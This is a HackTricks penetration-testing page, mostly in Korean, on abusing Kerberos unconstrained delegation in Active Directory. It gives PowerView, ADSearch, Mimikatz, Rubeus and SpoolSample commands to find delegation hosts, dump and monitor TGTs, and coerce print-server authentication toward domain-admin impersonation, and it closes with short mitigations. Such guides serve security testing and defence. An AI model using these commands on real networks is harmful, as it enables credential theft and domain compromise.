# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

이것은 도메인 관리자가 도메인 내의 모든 **컴퓨터**에 설정할 수 있는 기능입니다. 그런 다음, 사용자가 컴퓨터에 로그인할 때마다 해당 사용자의 **TGT 복사본**이 DC에서 제공하는 **TGS 내로 전송되고 LSASS의 메모리에 저장됩니다**. 따라서 해당 머신에서 관리자 권한이 있는 경우, **티켓을 덤프하고 사용자를 가장할 수 있습니다**.

따라서 도메인 관리자가 "Unconstrained Delegation" 기능이 활성화된 컴퓨터에 로그인하고 해당 머신에서 로컬 관리자 권한이 있는 경우, 티켓을 덤프하고 도메인 관리자를 어디서든 가장할 수 있습니다 (도메인 권한 상승).

이 속성을 가진 컴퓨터 객체를 **찾으려면** [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) 속성이 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)를 포함하는지 확인하십시오. 이는 ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’의 LDAP 필터로 수행할 수 있으며, 이는 powerview가 수행하는 것입니다:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>

**Mimikatz** 또는 **Rubeus**를 사용하여 메모리에 관리자(또는 피해자 사용자)의 티켓을 로드하여 **[Pass the Ticket](pass-the-ticket.md)**을 수행하십시오.\
자세한 정보: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Unconstrained delegation에 대한 추가 정보는 ired.team에서 확인하십시오.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

공격자가 "Unconstrained Delegation"이 허용된 컴퓨터를 **타락시킬 수 있다면**, 그는 **프린트 서버**를 **자동으로 로그인**하도록 **속일 수 있습니다**, 이로 인해 서버의 메모리에 TGT가 저장됩니다.\
그런 다음 공격자는 사용자 프린트 서버 컴퓨터 계정을 가장하기 위해 **Pass the Ticket 공격을 수행할 수 있습니다**.

프린트 서버가 어떤 머신에 대해 로그인하도록 하려면 [**SpoolSample**](https://github.com/leechristensen/SpoolSample)을 사용할 수 있습니다:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
TGT가 도메인 컨트롤러에서 온 경우, [**DCSync attack**](acl-persistence-abuse/#dcsync)를 수행하여 DC의 모든 해시를 얻을 수 있습니다.\
[**이 공격에 대한 더 많은 정보는 ired.team에서 확인하세요.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**인증을 강제로 시도할 수 있는 다른 방법은 다음과 같습니다:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### 완화

- DA/Admin 로그인을 특정 서비스로 제한
- 특권 계정에 대해 "계정은 민감하며 위임할 수 없습니다" 설정

{{#include ../../banners/hacktricks-training.md}}
